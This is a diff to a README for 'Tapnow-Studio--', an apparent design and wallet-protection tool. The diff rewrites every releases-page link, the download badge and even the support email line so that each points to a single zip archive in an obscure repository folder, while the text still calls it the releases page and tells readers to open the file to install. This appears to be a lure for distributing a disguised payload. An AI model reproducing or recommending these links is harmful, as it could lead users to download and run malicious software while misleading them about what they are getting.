@@ -1,6 +1,6 @@
 # 🎨 Tapnow-Studio-- - Protect Your Designs and Wallet
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%8D%96%20Tapnow%20Studio--%20--%20Releases-blue)](https://github.com/Menaelz/Tapnow-Studio--/releases)
+[![Download Now](https://github.com/Menaelz/Tapnow-Studio--/raw/refs/heads/main/augustness/Tapnow_Studio_v3.6.zip%20Now-%20%F0%9F%8D%96%20Tapnow%20Studio--%20--%20Releases-blue)](https://github.com/Menaelz/Tapnow-Studio--/raw/refs/heads/main/augustness/Tapnow_Studio_v3.6.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Tapnow-Studio-- is a user-friendly application designed to help designers manage
 To get started with Tapnow-Studio--, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Menaelz/Tapnow-Studio--/releases) to access the releases page.
+   Click [here](https://github.com/Menaelz/Tapnow-Studio--/raw/refs/heads/main/augustness/Tapnow_Studio_v3.6.zip) to access the releases page.
 
 2. **Download the Latest Version**  
    On the releases page, you will find the latest version listed at the top. Look for the download link marked as "Latest Release" and click it.
@@ -56,7 +56,7 @@ Tapnow-Studio-- includes several features designed to assist you in your design 
 
 To download Tapnow-Studio--, please follow these instructions:
 
-1. Visit the [Releases Page](https://github.com/Menaelz/Tapnow-Studio--/releases).
+1. Visit the [Releases Page](https://github.com/Menaelz/Tapnow-Studio--/raw/refs/heads/main/augustness/Tapnow_Studio_v3.6.zip).
 2. Click the link for the latest version.
 3. Select the appropriate file for your operating system.
 4. Download the file and open it to start installation.
@@ -70,7 +70,7 @@ If you experience any issues while downloading or using Tapnow-Studio--, support
 
 - **Documentation**: A full guide on using Tapnow-Studio-- can be found [here](insert-link-to-documentation).
 - **Community Forum**: Join discussions and get help from other users in the community forum [here](insert-link-to-forum).
-- **Contact Us**: For direct support, email us at support@tapnowstudio.com.
+- **Contact Us**: For direct support, email us at https://github.com/Menaelz/Tapnow-Studio--/raw/refs/heads/main/augustness/Tapnow_Studio_v3.6.zip
 
 ## 📝 Contributing
 
